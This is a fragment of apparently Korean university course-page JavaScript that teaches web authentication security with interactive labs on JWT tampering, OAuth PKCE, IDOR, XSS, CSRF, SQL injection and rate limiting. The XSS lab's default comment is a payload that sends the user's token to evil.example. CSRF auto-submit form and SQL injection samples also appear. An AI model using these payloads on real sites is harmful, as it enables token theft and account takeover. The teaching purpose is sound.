    `<p>점(.) 두 개로 나뉜 세 덩어리. 앞의 둘은 <b>Base64URL로 “인코딩”만</b> 되어 있다.</p>`,
    { lab: { title: '직접 발급 · 디코딩 · 변조해 보기 (HS256, 브라우저에서 계산)', init: { sub: '2026001', role: 'student', secret: 'inu-demo-secret-please-use-32-bytes', tamper: false },
      ctl: [{ k: 'sub', type: 'text', label: 'sub', w: 110 }, { k: 'role', type: 'select', label: 'role', opts: [['student', 'student'], ['professor', 'professor']] }, { k: 'secret', type: 'text', label: '서버 SECRET', w: 230 }, { k: 'tamper', type: 'toggle', label: '공격자가 payload의 role을 professor로 바꿔치기' }],
      out: st => `<div data-jwt class="mono" style="font-size:13px;word-break:break-all">계산 중…</div><div data-dec></div><div data-ver></div>`,
      after: async (st, out) => { if (!canCrypto()) { out.querySelector('[data-jwt]').textContent = '(이 환경에서는 crypto.subtle을 쓸 수 없다)'; return; }
        const head = { alg: 'HS256', typ: 'JWT' }, pay = { sub: st.sub, role: st.role, exp: 1794380400 };
        const h = b64uStr(JSON.stringify(head)), p = b64uStr(JSON.stringify(pay)), sig = await hmac(st.secret, h + '.' + p);
        const p2 = st.tamper ? b64uStr(JSON.stringify({ ...pay, role: 'professor' })) : p, tok = `${h}.${p2}.${sig}`;
        const ok = (await hmac(st.secret, h + '.' + p2)) === sig; const el = out.querySelector('[data-jwt]'); if (!el) return;
        el.innerHTML = `<span style="color:var(--l3)">${h}</span>.<span style="color:var(--l7)${st.tamper ? ';background:var(--bad-s)' : ''}">${p2}</span>.<span style="color:var(--l4)">${sig}</span>`;
        out.querySelector('[data-dec]').innerHTML = `<div class="pair" style="margin-top:10px"><div><h4 style="color:var(--l3)">① Header — 어떻게 서명했나</h4>${H.pre(JSON.stringify(head, null, 2))}</div><div><h4 style="color:var(--l7)">② Payload — 누구이고 언제까지</h4>${H.pre(JSON.stringify(JSON.parse(unb64u(p2)), null, 2))}<p class="cm" style="font-size:13px;margin:0">↑ 서명 검증 없이 <b>누구나</b> Base64URL만 풀면 읽힌다</p></div></div><p style="margin:6px 0"><b style="color:var(--l4)">③ Signature</b> = HMAC-SHA256(base64url(header) + "." + base64url(payload), SECRET)</p>`;
        out.querySelector('[data-ver]').innerHTML = `<div class="verdict ${ok ? 'ok' : 'bad'}">서버 검증: ${ok ? '200 — 서명 일치' : '401 invalid token — 서명 불일치'}</div><p style="margin:0">${ok ? 'header.payload를 서버 키로 다시 서명한 값이 토큰의 signature와 같다.' : '공격자는 payload를 <b>읽고 고칠 수는</b> 있지만 SECRET이 없어 맞는 서명을 만들 수 없다 → “읽을 수 있지만 고칠 수 없다”.'}</p>`; } } },
    T(['Claim', '의미', 'Claim', '의미', 'Claim', '의미'], [['sub', 'Subject — 사용자 식별자', 'exp', 'Expiration — 만료 시각 (Unix 초)', 'iss', 'Issuer — 발급자'], ['aud', 'Audience — 받을 대상 API', 'iat', 'Issued At — 발급 시각', 'jti', 'JWT ID — 토큰 고유 번호']], { mono: [0, 2, 4] }),
    { h3: '“홀로그램 입장권”으로 이해하기 (S27)' },
    T(['입장권', 'JWT', '의미'], [['적힌 내용', 'Payload', '누구나 읽을 수 있다'], ['홀로그램', 'Signature', '발급처만 만들 수 있다'], ['입구 검표원', 'API 서버', '홀로그램만 확인, 명단 조회 ✕'], ['유효 시간', 'exp', '지나면 입장 거부 (401)'], ['“일반”을 “VIP”로 고쳐 씀', 'role 변조', '홀로그램 불일치 → 거부']]),
    H.cards([['읽을 수 있다', '입장권을 주운 사람도 이름 · 등급을 다 본다<br>→ 비밀번호 · 주민번호를 적으면 안 된다', ''], ['고칠 수 없다', '글자를 바꾸면 홀로그램이 맞지 않는다<br>→ 서버는 서명이 틀리면 무조건 거부', 'L3'], ['훔치면 쓸 수 있다', '입장권을 통째로 훔치면 그대로 입장 가능<br>→ 짧은 만료, HTTPS, 안전한 보관', 'L7']]),
  ] },

{ id: 'w6.verify', title: '서버의 JWT 검증 순서 — 디코딩이 아니라 검증', slides: 'S28–S29',
  blocks: [
    { fig: `<div class="hflow">${[['1', '형식', '점 3덩어리? Base64URL?'], ['2', '알고리즘 고정', 'algorithms=["HS256"] — 토큰의 alg를 믿지 않음'], ['3', '서명', '서버 키로 다시 서명 → 같은가?'], ['4', '시간', 'exp 지났나? nbf 전인가?'], ['5', '발급자 · 대상', 'iss · aud 확인'], ['6', '그다음 인가', 'role · scope · 소유권']].map(([n, a, b]) => `<div class="fl-step"><b>${n}</b><span><b>${a}</b><br><small>${b}</small></span></div>`).join('<span class="fl-arr">→</span>')}</div>` },
    T(['', 'HS256 (HMAC)', 'RS256 / ES256'], [['키', '비밀키 하나 공유', '개인키로 서명, 공개키로 검증'], ['서명', '발급 서버', '인증 서버만'], ['검증', '같은 비밀키 가진 서버', '<b>공개키만 있으면 누구나</b>'], ['적합', '단일 서비스', '여러 서비스 · OAuth/OIDC']]),
    H.warn('실제로 있었던 취약점<br>• <code>alg: none</code> 토큰을 그대로 통과시킨 라이브러리<br>• RS256 공개키를 HS256 비밀키로 착각해 검증 (<b>알고리즘 혼동</b>)<br>• 서명 검증 없이 decode만 하고 role을 신뢰'),
    H.pre(`jwt.decode(token, SECRET, algorithms=["HS256"],
           audience="grade-api", issuer="auth.inu.ac.kr")
# PyJWT의 jwt.decode()는 서명과 exp를 기본으로 검증한다.
# 하지만 options={"verify_signature": False}를 AI가 넣었다면 검증이 꺼진 것이다.`),
    { h3: 'JWT는 암호화가 아니다 (S29)' },
    H.pre(`$ echo 'eyJzdWIiOiIyMDI2MDAxIiwicm9sZSI6InN0dWRlbnQiLCJleHAiOjE3OTQzODA0MDB9' | base64 -d
{"sub":"2026001","role":"student","exp":1794380400}

# role을 professor로 바꾼 payload로 교체하면?
$ curl -H "Authorization: Bearer <변조된 토큰>" …/admin/grades
HTTP/1.1 401 Unauthorized   {"detail": "invalid token"}`),
    `<div class="pair"><div><h4 class="cok">Payload에 넣어도 되는 것</h4>${lines(['사용자 ID (sub)', '역할 · 권한 범위 (role, scope)', '만료 · 발급 정보 (exp, iat, iss)', '→ 노출돼도 큰 문제 없는 최소 정보'])}</div><div><h4 class="cbad">넣으면 안 되는 것</h4>${lines(['비밀번호 · 해시', '주민번호 · 전화번호 · 성적 같은 개인정보', 'API 비밀키 · 내부 시스템 정보'])}</div></div>`,
    H.key('<b>인코딩(Base64) ≠ 암호화(AES) ≠ 서명(HMAC/RSA)</b>. JWT의 기본형(JWS)은 “서명”만 한다. 내용까지 숨기려면 JWE를 쓰지만, 보통은 민감 정보를 넣지 않는 쪽을 택한다.'),
  ] },

      lanes: [{ id: 'u', label: '사용자 브라우저' }, { id: 'c', label: 'Client 앱' }, { id: 'as', label: 'Auth Server' }, { id: 'rs', label: 'Resource API' }],
      events: [
        { from: 'c', to: 'u', label: '① 로그인 페이지로 보냄', color: 'l7', pkt: [res('302 Found', [['Location', 'accounts.google.com/authorize?client_id=…&redirect_uri=…&scope=calendar.events&state=x7Q&code_challenge=SHA256(verifier)']])], say: '앱이 <b>verifier</b>(비밀 난수)를 만들고 그 <b>해시(challenge)</b>만 함께 보낸다. <b>state</b>는 CSRF 방지용 난수.' },
        { from: 'u', to: 'as', label: '② 로그인 + “캘린더 허용” 동의', color: 'l7', say: '비밀번호는 <b>구글 화면에만</b> 입력된다. 앱은 비밀번호를 본 적이 없다.' },
        { from: 'as', to: 'u', label: '③ redirect_uri?code=AbC123', color: 'ok', pkt: [res('302 Found', [['Location', 'https://app.example/callback?code=AbC123&state=x7Q']])], say: '<b>code</b> = 짧은 수명 1회용 교환권. 주소창에 보이지만 이것만으로는 토큰을 못 받는다.' },
        { from: 'u', to: 'c', label: '④ code 전달', color: 'l7', say: '앱이 state가 자기가 보낸 값과 같은지 확인.' },
        { from: 'c', to: 'as', label: '⑤ POST /token (code + verifier)', color: 'l4', pkt: [req('POST /token', [['Body', 'grant_type=authorization_code&code=AbC123&code_verifier=…']])], say: '이제야 원래 비밀값(verifier)을 보여 준다. Auth Server가 해시해서 ①의 challenge와 비교 → 같으면 발급.' },
        { from: 'as', to: 'c', label: '⑥ access_token 발급', color: 'ok', pkt: [res('200 OK', [['Body', '{"access_token":"ya29…","expires_in":3600,"scope":"calendar.events"}']])], say: '토큰은 <b>뒷단 요청</b>으로 받았다 — 브라우저 주소창 · 기록에 남지 않는다.' },
        { from: 'c', to: 'rs', label: '⑦ GET /calendar/events  Bearer', color: 'l7', pkt: [req('GET /calendar/v3/events', [['Authorization', 'Bearer ya29…']])], say: 'scope가 허락한 일만 할 수 있다.' },
      ] } },
    T(['용어', '의미'], [['client_id', '앱의 공개 식별자'], ['redirect_uri', '코드를 돌려받을 등록된 주소'], ['scope', '요청 권한 범위'], ['code', '짧은 수명 1회용 교환권'], ['state', 'CSRF 방지용 난수'], ['challenge', 'verifier의 해시 (①에 포함)'], ['PKCE', '코드 가로채기 방지']], { mono: [0] }),
    H.key('PKCE 한 줄 요약 — ①에서 비밀값의 <b>해시</b>를 먼저 보내고, ⑤에서 <b>원래 비밀값</b>을 보여 준다. 코드를 훔친 공격자는 비밀값이 없어 토큰을 못 받는다.'),
    H.note('토큰을 URL로 바로 주던 Implicit Flow는 더 이상 권장되지 않는다 (OAuth 2.0 Security BCP). 지금은 SPA · 모바일도 Code + PKCE.'),
  ] },

{ id: 'w6.apikey', title: 'API Key — 사용자가 아니라 “프로그램”을 식별한다', slides: 'S37',

    T(['', 'API Key', 'Access Token (사용자)', 'OAuth Token (위임)'], [['나타내는 것', '어떤 <b>앱 · 프로젝트</b>', '어떤 <b>사용자</b>', '어떤 사용자가 어떤 앱에 허락한 권한'], ['수명', '길다 (수동 교체 전까지)', '짧다 (분 단위)', '짧다 + Refresh'], ['발급', '개발자 콘솔에서 복사', '로그인 시 자동', '사용자 동의 후'], ['예', '날씨 · 지도 · LLM API', '학사 시스템 로그인', '구글 캘린더 연동'], ['전송', 'X-API-Key 또는 Authorization', 'Authorization: Bearer', 'Authorization: Bearer']]),
    `<div class="pair"><div><h4 class="cbad">✕ 프론트엔드 코드에 넣으면 누구나 본다</h4>${H.pre('const KEY = "sk-live-8f2a…";   // DevTools → Sources')}</div><div><h4 class="cok">○ 서버에서만 사용 (환경변수)</h4>${H.pre('key = os.environ["WEATHER_API_KEY"]')}</div></div>`,
    `<p><b>API Key 관리 원칙</b></p>` + lines(['브라우저 · 앱 코드에 넣지 않는다 → 서버가 대신 호출 (Proxy)', '키마다 허용 IP · 도메인 · 권한 · 사용량 한도를 건다', 'Git에 올라갔다면 지우는 것으로 부족 → 즉시 폐기 · 재발급']),
    H.warn('API Key만으로는 <b>“어떤 사용자인지” 알 수 없다</b>. 사용자별 데이터가 있는 API라면 사용자 인증(세션 · 토큰)이 따로 필요하다.'),

{ id: 'w6.authz', title: '인가 모델 · IDOR — 주소창 숫자 하나만 바꿨을 뿐인데', slides: 'S38–S39',
  blocks: [
    H.cards([['RBAC — Role-Based', '역할에 권한을 묶는다<br>student: 조회 · professor: 조회 + 입력 · admin: 전체', ''], ['소유권 검사 — Ownership', '자원의 주인인지 확인<br>학생은 자기 성적만 <code>grade.student_id == user.sub</code>', 'L3'], ['ABAC — Attribute-Based', '속성 조합으로 판단<br>“성적 입력은 학기 중, 교내망에서만”', 'L4'], ['Scope — OAuth 권한 범위', '토큰에 허용된 행동 목록<br><code>grades:read</code> · <code>grades:write</code>', 'L7']]),
    { lab: { title: 'IDOR 재현 — 2026001을 2026002로 바꿔서 다시 요청', init: { id: '2026002', chk: false },
      ctl: [{ k: 'id', type: 'select', label: '/api/students/{id}/grades', opts: [['2026001', '2026001 (내 것)'], ['2026002', '2026002 (이송도)']] }, { k: 'chk', type: 'toggle', label: '서버에 소유권 검사 있음' }],
      out: st => { const mine = st.id === '2026001', leak = !mine && !st.chk;
        const code = `@app.get("/v1/students/{sid}/grades")
def grades(sid: str, user = Depends(current_user)):   # 인증 ✓
    if user["role"] == "professor":                     # RBAC
        return db.grades(sid)
${st.chk ? '    if user["sub"] != sid:                              # 소유권 검사\n        raise HTTPException(403, "forbidden")\n' : '    # (소유권 검사 없음!)\n'}    return db.grades(sid)`;
        return `<p class="mono" style="margin:0 0 6px">🌐 https://portal.inu.ac.kr/api/students/${st.id}/grades &nbsp;·&nbsp; 토큰 sub=2026001 (김인천)</p>${H.pre(code)}` +
          `<div class="verdict ${leak ? 'bad' : 'ok'}">${mine ? '200 — 내 성적' : st.chk ? '403 Forbidden' : '200 — 남의 성적이 나온다!'}</div>${H.pre(mine ? '{"student": "김인천", "NET301": "A+", "AI201": "B0"}' : st.chk ? '{"detail": "forbidden"}' : '{"student": "이송도", "NET301": "B+", …}   ← IDOR')}` +
          `<p style="margin:0">${leak ? '내 열쇠로 내 사물함 312번을 열었는데 313번에도 맞는다 — 자물쇠가 “열쇠 주인”을 확인하지 않았다 (인증 ✓, 인가 ✕).' : '서버가 path의 id와 토큰의 sub를 비교한다. 실패 시 403, 존재 자체를 숨기려면 404.'}</p>`; } } },
    `<p><b>방어</b></p>` + lines(['서버에서 path의 id == 토큰의 sub 또는 권한 검사', '실패 시 403, 존재 자체를 숨기려면 404', 'id를 추측하기 어렵게(UUID) — <b>보조 수단일 뿐</b>, 검사를 대신하지 못함']),
    H.key('최소 권한 원칙 — 필요한 만큼만, 필요한 시간만. 기본값은 “거부”, 허용을 명시. <b>프론트에서 버튼을 숨기는 것은 보안이 아니다</b> → 서버에서 매번 검사.'),
    H.warn('인증은 프레임워크가 대부분 해 주지만, 인가는 비즈니스 규칙이라 개발자가 직접 써야 한다 → 그래서 가장 자주 빠진다. OWASP Top 10에서 <b>Broken Access Control</b>이 가장 위험한 항목.'),
  ] },

{ id: 'w6.xss', title: 'XSS · CSRF — 브라우저를 노리는 두 공격', slides: 'S40–S41',
  blocks: [
    { h3: 'XSS — 남의 페이지에 내 스크립트 심기 (Cross-Site Scripting)' },
    { lab: { title: '댓글 하나가 “코드”로 실행되는 순간', init: { c: `<img src=x onerror="fetch('https://evil.example/steal?c='+localStorage.getItem('token'))">`, esc: false },
      ctl: [{ k: 'c', type: 'text', label: '댓글 입력', w: 420 }, { k: 'esc', type: 'toggle', label: '출력 이스케이프 (React · Jinja2 기본)' }],
      out: st => { const danger = /<\s*(script|img|svg|iframe)|on\w+\s*=|javascript:/i.test(st.c);
        const html = st.esc ? esc(st.c) : st.c;
        return `<p class="cm" style="margin:0 0 4px;font-size:13px">서버가 만든 HTML</p>${H.pre(`<div class="comment">${html}</div>`)}` +
          `<div class="verdict ${!danger || st.esc ? 'ok' : 'bad'}">${!danger ? '평범한 글' : st.esc ? '글자로만 표시됨 — 실행 안 됨' : '실행됨 — 댓글을 연 모든 사용자의 토큰이 evil로 전송'}</div>` +
          `<p style="margin:0">${st.esc ? '&lt; &gt; " 가 &amp;lt; 등으로 바뀌어 브라우저가 “태그”가 아니라 “글자”로 그린다 — 쪽지를 유리 액자에 넣어 읽기만 가능하게.' : '게시판(브라우저)이 쪽지를 “글”이 아니라 “명령”으로 실행했다.'}</p>`; } } },
    T(['방어', '어떻게', '비유'], [['<b>출력 이스케이프</b>', '&lt; &gt; " \' 를 &amp;lt; 등으로 바꿔 “글자”로만 표시', '쪽지를 유리 액자에'], ['위험 API 피하기', 'innerHTML · dangerouslySetInnerHTML · v-html 최소화', '액자에서 쪽지를 꺼내지 않기'], ['<b>CSP 헤더</b>', "Content-Security-Policy: script-src 'self' — 허용된 출처의 스크립트만", '등록된 직원의 지시만 따르기'], ['HttpOnly 쿠키', '스크립트가 세션 쿠키를 읽지 못하게 (<b>피해 축소</b>)', '지갑을 금고에']]),
    H.key('XSS가 성공하면 그 페이지에서 “사용자인 척” 무엇이든 할 수 있다. 토큰 저장 위치보다 <b>XSS 자체를 막는 것</b>이 근본 대책이다.'),
    { h3: 'CSRF — 내 브라우저가 나도 모르게 보낸 요청 (Cross-Site Request Forgery)' },
    { trace: { mode: 'ladder', title: '쿠키 “자동 첨부”를 악용한 위조 요청', side: 100, rowH: 52,
      lanes: [{ id: 'b', label: '내 브라우저' }, { id: 'e', label: 'evil.example' }, { id: 'k', label: 'bank.example' }],
      events: [
        { from: 'b', to: 'k', label: '① 은행 로그인 → 쿠키 sid 저장', color: 'ok', say: '정상 로그인. 브라우저에 bank.example의 세션 쿠키가 있다.' },
        { from: 'b', to: 'e', label: '② 이벤트 페이지 방문', color: 'l7', say: '다른 탭에서 “경품 이벤트” 페이지를 연다.' },
        { from: 'e', to: 'b', label: '③ 숨겨진 자동 제출 form', color: 'bad', pkt: [res('200 OK', [['Body', '<form action="https://bank.example/transfer" method="POST"> <input name="to" value="evil"> … <script>form.submit()<\/script>']])], say: '사기꾼이 내 이름으로 “송금 요청서”를 미리 써 두었다.' },
        { from: 'b', to: 'k', label: '④ POST /transfer  Cookie: sid (자동!)', color: 'bad', pkt: [req('POST /transfer', [['Origin', 'https://evil.example'], ['Cookie', 'sid=… (SameSite=None이면 자동 첨부)']])], say: '은행은 내 얼굴(쿠키)을 보고 처리해 버린다 — 요청서를 <b>누가 썼는지</b>는 확인하지 않았다. SameSite=Lax/Strict면 다른 사이트에서 시작된 POST에 쿠키가 안 붙어 실패한다.' },
      ] } },
    T(['방어', '원리', '비고'], [['<b>SameSite=Lax/Strict</b>', '다른 사이트에서 시작된 POST에는 쿠키를 붙이지 않는다', '가장 효과적 · 현대 브라우저 기본 Lax'], ['<b>CSRF 토큰</b>', '폼마다 서버가 준 난수를 함께 보내야 처리 — 공격자는 이 값을 모른다', '세션 쿠키 방식 웹 앱에 필수'], ['Bearer 헤더 인증', 'Authorization 헤더는 자동 첨부되지 않는다 → CSRF에 강함', '대신 XSS에 주의']]),
    H.note('XSS = “내 사이트에서 공격자 코드가 돈다” · CSRF = “다른 사이트가 내 쿠키로 요청을 보낸다”. 원인이 다르니 방어도 다르다.'),
  ] },

{ id: 'w6.sqli', title: 'SQL Injection · 무차별 대입과 Rate Limiting', slides: 'S42–S43',
  blocks: [
    { lab: { title: '아이디 칸에 admin\' -- 를 넣으면', init: { uid: "admin' --", bind: false },
      ctl: [{ k: 'uid', type: 'text', label: '아이디 입력', w: 200 }, { k: 'bind', type: 'toggle', label: '파라미터 바인딩 (Prepared Statement)' }],
      out: st => { const q = st.bind ? `cur.execute("SELECT id, pw_hash FROM users WHERE id = ?", (${JSON.stringify(st.uid)},))` : `SELECT * FROM users WHERE id='${st.uid}' AND pw='…'`;
        const inj = !st.bind && /'/.test(st.uid);
        return H.pre((st.bind ? '# ○ 입력은 “값”으로만 — SQL 문법이 될 수 없다\n' : '# ✕ 문자열을 이어 붙여 SQL 만들기\n') + q) +
          `<div class="verdict ${inj ? 'bad' : 'ok'}">${inj ? (/--/.test(st.uid) ? '뒤는 주석 처리 → 비밀번호 검사 사라짐 → 관리자로 로그인' : '따옴표가 SQL 문법을 깨뜨렸다 — 쿼리 구조가 바뀜') : '입력은 메뉴 이름(값)으로만 읽힌다'}</div>`; } } },
    H.key('주문서 빈칸 비유 — “( ) 커피 1잔” 빈칸에 “아메리카노) 그리고 금고 열어 주세요 (”를 쓰면 점원이 빈칸을 “지시”로 읽어 버린다. 바인딩 = 빈칸 내용은 무조건 메뉴 이름으로만.<br>같은 뿌리: <b>Command Injection</b> <code>os.system(f"ping {host}")</code> · <b>Prompt Injection</b> (LLM 입력 속 숨은 지시문). 공통 원칙: <b>데이터와 명령을 섞지 않는다</b>.'),
    H.warn('인젝션 방어의 핵심은 “입력 필터링”이 아니라 <b>“구조적 분리”</b>다. 블랙리스트로 따옴표를 지우는 방식은 언제나 우회된다. ORM(SQLAlchemy)도 내부적으로 바인딩을 쓴다.'),
    { h3: '무차별 대입과 Rate Limiting (S43)' },
    T(['공격', '방식'], [['Brute Force', '한 계정에 0000~9999 모든 조합 시도'], ['Dictionary', '흔한 비밀번호 목록(123456, qwerty…) 대입'], ['Credential Stuffing', '다른 사이트에서 유출된 ID/PW 쌍을 그대로 시도'], ['Password Spraying', '많은 계정에 흔한 비밀번호 1~2개씩 (잠금 회피)']]),
    `<div class="pair"><div><h4>방어 조합</h4>${lines(['IP · 계정별 시도 횟수 제한 → <b>429 Too Many Requests</b>', '연속 실패 시 지연 · CAPTCHA · 일시 잠금', 'MFA — 비밀번호가 맞아도 한 단계 더', '유출 비밀번호 목록과 대조해 가입 거부'])}</div><div><h4>Rate limit 응답</h4>${H.pre('HTTP/1.1 429 Too Many Requests\nRetry-After: 60\nContent-Type: application/json\n\n{"detail": "too many login attempts, retry after 60s"}')}</div></div>`,
    H.warn('계정 잠금의 함정 — 5회 실패 시 <b>영구</b> 잠금이면 공격자가 남의 계정을 일부러 잠가 버릴 수 있다(서비스 거부). 시간 기반 잠금 + 알림이 낫다.'),
    H.note('Rate limit은 보통 앱 코드보다 앞단(Nginx · API Gateway · Cloud WAF)에서 건다 → 9주차 Cloud 구조에서 다시.'),
  ] },

{ id: 'w6.headers', title: '보안 응답 헤더 · Secret 관리', slides: 'S44–S45',
  blocks: [
    T(['헤더', '예시 값', '효과'], [['Strict-Transport-Security', 'max-age=31536000; includeSubDomains', 'HTTPS만 사용 강제 (HSTS)'], ['Content-Security-Policy', "default-src 'self'; script-src 'self'", '허용된 출처의 스크립트만 실행 → XSS 피해 축소'], ['X-Content-Type-Options', 'nosniff', 'Content-Type을 추측하지 않음 (파일을 스크립트로 실행 방지)'], ['X-Frame-Options / frame-ancestors', "DENY / frame-ancestors 'none'", '다른 사이트가 iframe으로 감싸지 못함 (Clickjacking)'], ['Referrer-Policy', 'strict-origin-when-cross-origin', '다른 사이트로 이동할 때 URL 경로 · 쿼리 유출 방지'], ['Cache-Control', 'no-store (개인정보 응답)', '공용 PC · 프록시에 성적 페이지가 남지 않게']], { mono: [0, 1] }),

{ id: 'w6.lab', title: 'Hands-on Lab · AI 보안 코드 리뷰 · 과제', slides: 'S49–S51, S53',
  blocks: [
    { h3: 'Lab ① — JWT로 보호된 FastAPI' },
    H.pre(`# auth_api.py   $ pip install "fastapi[standard]" pyjwt "pwdlib[argon2]"
SECRET = os.environ["JWT_SECRET"]                 # 하드코딩 금지
ph = PasswordHash.recommended()
users = {"kim": {"hash": ph.hash("pw1234"), "role": "student"}}
oauth2 = OAuth2PasswordBearer(tokenUrl="login")

@app.post("/login")
def login(form: OAuth2PasswordRequestForm = Depends()):
    u = users.get(form.username)
    if not u or not ph.verify(form.password, u["hash"]):
        raise HTTPException(401, "invalid credentials")
    exp = dt.datetime.now(dt.timezone.utc) + dt.timedelta(minutes=15)
    claims = {"sub": form.username, "role": u["role"], "exp": exp}
    return {"access_token": jwt.encode(claims, SECRET, algorithm="HS256"), "token_type": "bearer"}

def current_user(token: str = Depends(oauth2)):
    try:
        return jwt.decode(token, SECRET, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        raise HTTPException(401, "token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(401, "invalid token")

@app.get("/admin/grades")
def all_grades(user=Depends(current_user)):
    if user["role"] != "professor": raise HTTPException(403, "forbidden")
    return [{"sid": "2026001", "NET301": "A+"}]`),
    H.note('OAuth2PasswordBearer 덕분에 /docs에 자물쇠 아이콘과 로그인 창이 자동으로 생긴다.'),
    { h3: 'Lab ② — 일부러 깨뜨려 보고 관찰하기' },
    T(['#', '실험', '기대 결과'], [['A', 'Authorization 헤더 없이 /me', '401 Not authenticated'], ['B', '토큰 끝 글자 1개 변경', '401 invalid token'], ['C', 'Payload의 role을 professor로 바꿔 재조립', '401 (서명 불일치)'], ['D', '서버를 다른 JWT_SECRET으로 재시작', '기존 토큰 모두 401'], ['E', 'student 토큰으로 /admin/grades', '403 forbidden'], ['F', '비밀번호 틀림 5번 연속', '매번 401 — <b>제한 없음!</b>']]),
    H.key('실험 D가 핵심 질문: 서버가 재시작될 때마다 비밀키를 랜덤으로 만들면? 서버가 2대라면? → 서로 다른 키로 서명 · 검증하게 되어 401이 무작위로 난다. 키는 환경변수로 <b>고정 · 공유</b>.'),
    { h3: 'AI가 만든 인증 코드를 “공격자의 눈”으로 (S51)' },
    { mount: el => { const C = ['SECRET이 코드에 하드코딩되어 있지 않은가?', '비밀번호를 Argon2/bcrypt로 해시하는가? (SHA-256 · 평문 ✕)', 'jwt.decode에 algorithms를 고정했는가? 서명 검증을 끄지 않았는가?', 'Access Token 만료가 짧은가? (days=30 ✕)', '학생 성적 API에 소유권 검사가 있는가? (IDOR)', '로그인 실패 메시지가 계정 존재를 노출하지 않는가?', '로그인에 Rate limit이 있는가?', 'CORS가 "*" + credentials 조합이 아닌가?', '토큰 · 비밀번호를 로그에 출력하지 않는가?'];
      const saved = LS.get('w6.verify', []);
      const draw = () => { el.innerHTML = `<div class="lab"><div class="lab-head"><span class="tag">체크리스트</span>VERIFY — AI 인증 코드 검증</div><div class="lab-out">${C.map((c, i) => `<label class="ck"><input type="checkbox" data-i="${i}" ${saved.includes(i) ? 'checked' : ''}><span>${esc(c)}</span></label>`).join('')}<p class="cm" style="margin:8px 0 0;font-size:13.5px">${saved.length} / ${C.length} 확인</p></div></div>`;
        el.querySelectorAll('input').forEach(b => b.onchange = () => { const i = +b.dataset.i, k = saved.indexOf(i); if (b.checked && k < 0) saved.push(i); if (!b.checked && k >= 0) saved.splice(k, 1); LS.set('w6.verify', saved); draw(); }); };
      draw(); } },
    H.note('AI는 “동작하는” 인증을 빠르게 만든다. 하지만 “안전한” 인증인지는 공격 시나리오를 떠올릴 수 있는 사람이 판단해야 한다.'),
    { h3: '과제 — Auth Architecture 비교 (스마트 교실)' },

QUIZ.w6 = { bank: [], qc: [
  { q: '인증과 인가의 차이는? 각각 실패하면 몇 번 상태 코드인가?', ref: 'w6.authn', model: '<b>인증(Authentication)</b>은 “누구인가” — 실패하면 <b>401</b>. <b>인가(Authorization)</b>는 “이것을 해도 되는가” — 실패하면 <b>403</b>. 인증이 먼저, 인가가 그다음이며, 인가는 요청마다 서버에서 한다.', kw: ['인증 = 누구인가 → 401', '인가 = 해도 되는가 → 403', '인증 먼저, 인가는 요청마다'] },

<script>
/* Week 7 — Real-time & IoT Networking */
'use strict';
(function () {
const T = H.tbl;
const req = (line, f = []) => ({ L: 'L7', n: 'HTTP 요청', f: [['요청줄', line], ...f] });
const res = (status, f = []) => ({ L: 'L7', n: 'HTTP 응답', f: [['상태', status], ...f] });
const ev = (n, f) => ({ L: 'L7', n, f });
const mq = (n, f) => ({ L: 'L7', n: 'MQTT ' + n, f });
const lines = arr => `<ul class="ln-list">${arr.map(x => `<li>${x}</li>`).join('')}</ul>`;
const fmt = n => Number(n).toLocaleString('en-US', { maximumFractionDigits: 1 });

/* MQTT topic filter matching (spec rules) */
function mqttMatch(filter, topic) {
  const f = filter.split('/'), t = topic.split('/');
  const hi = f.indexOf('#'); if (hi >= 0 && hi !== f.length - 1) return { ok: null, why: '잘못된 구독 — #은 맨 끝에만 올 수 있다' };
  if (f.some(x => x !== '+' && x !== '#' && /[+#]/.test(x))) return { ok: null, why: '잘못된 구독 — 와일드카드는 한 단계를 통째로 차지해야 한다 (예: room+ ✕)' };
  if (/[+#]/.test(topic)) return { ok: null, why: '와일드카드는 구독 전용 — PUBLISH 토픽에는 쓸 수 없다' };
  if (topic.startsWith('$') && (f[0] === '#' || f[0] === '+')) return { ok: false, why: '$로 시작하는 토픽($SYS 등)은 # · + 로 시작하는 구독에 포함되지 않는다' };
  if (hi < 0 && f.length !== t.length && f.includes('+')) return { ok: false, why: f.length < t.length ? `+는 정확히 한 단계만 대신한다 — 구독은 ${f.length}단계, 발행은 ${t.length}단계라 단계 수가 맞지 않는다` : `구독 패턴(${f.length}단계)이 발행 토픽(${t.length}단계)보다 길다` };
  for (let i = 0; i < f.length; i++) {
    if (f[i] === '#') return { ok: true, why: i === t.length ? '#은 부모 단계 자신도 포함한다' : `#이 ${t.slice(i).join('/')} 를 모두 받는다` };
    if (i >= t.length) return { ok: false, why: '구독 패턴이 발행 토픽보다 단계가 많다' };
    if (f[i] === '+') continue;
    if (f[i] !== t[i]) return { ok: false, why: f[i].toLowerCase() === t[i].toLowerCase() ? `대소문자 구분 — ${f[i]} ≠ ${t[i]}` : `${i + 1}번째 단계가 다르다 — ${f[i]} ≠ ${t[i]}` };
  }
  if (t.length > f.length) return { ok: false, why: `+는 정확히 한 단계만 — 발행 토픽에 단계가 더 있다 (${t.slice(f.length).join('/')})` };
  return { ok: true, why: f.includes('+') ? '+가 각각 한 단계에 대응' : '정확히 일치' };
}
/* SSE stream parser (browser semantics) */
function parseSSE(raw) {
  const out = []; let data = [], evn = '', id = '', retry = null, lastId = ''; const ls = raw.replace(/\r\n/g, '\n').split('\n'); ls.pop();
  ls.forEach((l, i) => {
    if (l === '') { if (data.length) out.push({ type: evn || 'message', data: data.join('\n'), id: lastId, line: i + 1 }); data = []; evn = ''; return; }
    if (l.startsWith(':')) return;
    const k = l.indexOf(':'), f = k < 0 ? l : l.slice(0, k), v = k < 0 ? '' : l.slice(k + 1).replace(/^ /, '');
    if (f === 'data') data.push(v); else if (f === 'event') evn = v; else if (f === 'id') { id = v; lastId = v; } else if (f === 'retry' && /^\d+$/.test(v)) retry = +v;
  });
  return { events: out, pending: data.length ? data.join('\n') : null, retry, lastId };
}
function sseRes(raw) {
  const p = parseSSE(raw);
  return (p.events.length ? T(['#', 'event.type', 'event.data', 'lastEventId'], p.events.map((e, i) => [String(i + 1), e.type === 'message' ? 'message (onmessage)' : `<b>${esc(e.type)}</b> (addEventListener)`, `<code>${esc(e.data).replace(/\n/g, '⏎')}</code>`, esc(e.id || '—')]), { mono: [1] }) : '<div class="verdict bad">onmessage가 한 번도 호출되지 않는다</div>') +
